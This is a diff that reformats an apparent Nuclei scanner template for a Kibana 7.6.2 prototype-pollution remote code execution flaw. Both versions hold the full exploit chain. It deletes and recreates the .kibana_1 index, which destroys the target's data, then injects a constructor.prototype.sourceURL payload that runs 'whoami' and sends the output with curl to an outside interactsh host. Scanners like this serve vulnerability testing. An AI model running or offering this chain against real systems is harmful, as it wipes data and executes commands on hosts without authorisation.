@@ -1,114 +1,155 @@
-http:
-- matchers:
-  - part: body_2
-    type: word
-    words:
-    - .kibana_1
-  - part: body_3
-    type: word
-    words:
-    - '{"acknowledged":true}'
-  - part: body_4
-    type: word
-    words:
-    - created
-  - part: interactsh_protocol
-    type: word
-    words:
-    - dns
-  matchers-condition: and
-  raw:
-  - 'DELETE /.kibana_1 HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Content-Type: application/json; charset=utf-8
-
-    Accept-Encoding: gzip, deflate, br
-
-    '
-  - 'PUT /.kibana_1 HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Content-Type: application/json; charset=utf-8
-
-    Accept-Encoding: gzip, deflate, br
-
-    '
-  - "PUT /.kibana_1/_mappings HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json;\
-    \ charset=utf-8\nAccept-Encoding: gzip, deflate, br\n\n{\n\"properties\": {\n\"\
-    upgrade-assistant-telemetry\": {\n\"properties\": {\n\"constructor\": {\n  \"\
-    properties\": {\n    \"prototype\": {\n      \"properties\": {\n        \"sourceURL\"\
-    : {\n          \"type\": \"text\",\n          \"fields\": {\n            \"keyword\"\
-    : {\n              \"type\": \"keyword\",\n              \"ignore_above\": 256\n\
-    \            }\n          }\n        }\n      }\n    }\n  }\n},\n\"features\"\
-    : {\n  \"properties\": {\n    \"deprecation_logging\": {\n      \"properties\"\
-    : {\n        \"enabled\": {\n          \"type\": \"boolean\",\n          \"null_value\"\
-    : true\n        }\n      }\n    }\n  }\n},\n\"ui_open\": {\n  \"properties\":\
-    \ {\n    \"cluster\": {\n      \"type\": \"long\",\n      \"null_value\": 0\n\
-    \    },\n    \"indices\": {\n      \"type\": \"long\",\n      \"null_value\":\
-    \ 0\n    },\n    \"overview\": {\n      \"type\": \"long\",\n      \"null_value\"\
-    : 0\n    }\n  }\n},\n\"ui_reindex\": {\n  \"properties\": {\n    \"close\": {\n\
-    \      \"type\": \"long\",\n      \"null_value\": 0\n    },\n    \"open\": {\n\
-    \      \"type\": \"long\",\n      \"null_value\": 0\n    },\n    \"start\": {\n\
-    \      \"type\": \"long\",\n      \"null_value\": 0\n    },\n    \"stop\": {\n\
-    \      \"type\": \"long\",\n      \"null_value\": 0\n    }\n  }\n}\n}\n}\n}\n\
-    }\n"
-  - 'PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Content-Type: application/json; charset=utf-8
-
-    Accept-Encoding: gzip, deflate, br
-
-
-    {
-
-    "upgrade-assistant-telemetry" : {
-
-    "ui_open.overview" : 1,
-
-    "ui_open.cluster" : 1,
-
-    "ui_open.indices" : 1,
-
-    "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require(''child_process'').exec(''whoami
-    | curl http://{{interactsh-url}}/ -d@-'')"
-
-    },
-
-    "type" : "upgrade-assistant-telemetry",
-
-    "updated_at" : "2020-04-17T20:47:40.80"
-
-    }
-
-    '
-  - 'GET / HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Content-Type: application/json; charset=utf-8
-
-    Accept-Encoding: gzip, deflate, br
-
-    '
 id: kibana-prototype-pollution
-info:
-  author: pussycat0x
-  description: 'There is a prototype pollution bug in the upgrade assistant''s telemetry
-    collector, via a dangerous usage of _.set
 
-    '
+info:
+  name: Kibana 7.6.2 - Remote Code Execution
+  author: pussycat0x
+  severity: critical
+  description: |
+    There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of _.set
+  reference:
+    - https://hackerone.com/reports/852613
   metadata:
     max-request: 1
-    product: kibana
     shodan-query: product:"Elastic" && 7.6.2
     vendor: elastic
-  name: Kibana 7.6.2 - Remote Code Execution
-  reference:
-  - https://hackerone.com/reports/852613
-  severity: critical
+    product: kibana
   tags: kibana,rce
+
+http:
+  - raw:
+      - |
+        DELETE /.kibana_1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        Accept-Encoding: gzip, deflate, br
+
+      - |
+        PUT /.kibana_1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        Accept-Encoding: gzip, deflate, br
+
+      - |
+        PUT /.kibana_1/_mappings HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        Accept-Encoding: gzip, deflate, br
+
+        {
+        "properties": {
+        "upgrade-assistant-telemetry": {
+        "properties": {
+        "constructor": {
+          "properties": {
+            "prototype": {
+              "properties": {
+                "sourceURL": {
+                  "type": "text",
+                  "fields": {
+                    "keyword": {
+                      "type": "keyword",
+                      "ignore_above": 256
+                    }
+                  }
+                }
+              }
+            }
+          }
+        },
+        "features": {
+          "properties": {
+            "deprecation_logging": {
+              "properties": {
+                "enabled": {
+                  "type": "boolean",
+                  "null_value": true
+                }
+              }
+            }
+          }
+        },
+        "ui_open": {
+          "properties": {
+            "cluster": {
+              "type": "long",
+              "null_value": 0
+            },
+            "indices": {
+              "type": "long",
+              "null_value": 0
+            },
+            "overview": {
+              "type": "long",
+              "null_value": 0
+            }
+          }
+        },
+        "ui_reindex": {
+          "properties": {
+            "close": {
+              "type": "long",
+              "null_value": 0
+            },
+            "open": {
+              "type": "long",
+              "null_value": 0
+            },
+            "start": {
+              "type": "long",
+              "null_value": 0
+            },
+            "stop": {
+              "type": "long",
+              "null_value": 0
+            }
+          }
+        }
+        }
+        }
+        }
+        }
+
+      - |
+        PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        Accept-Encoding: gzip, deflate, br
+
+        {
+        "upgrade-assistant-telemetry" : {
+        "ui_open.overview" : 1,
+        "ui_open.cluster" : 1,
+        "ui_open.indices" : 1,
+        "constructor.prototype.sourceURL": "\u2028\u2029\nglobal.process.mainModule.require('child_process').exec('whoami | curl http://{{interactsh-url}}/ -d@-')"
+        },
+        "type" : "upgrade-assistant-telemetry",
+        "updated_at" : "2020-04-17T20:47:40.80"
+        }
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+        Accept-Encoding: gzip, deflate, br
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - ".kibana_1"
+
+      - type: word
+        part: body_3
+        words:
+          - '{"acknowledged":true}'
+
+      - type: word
+        part: body_4
+        words:
+          - "created"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
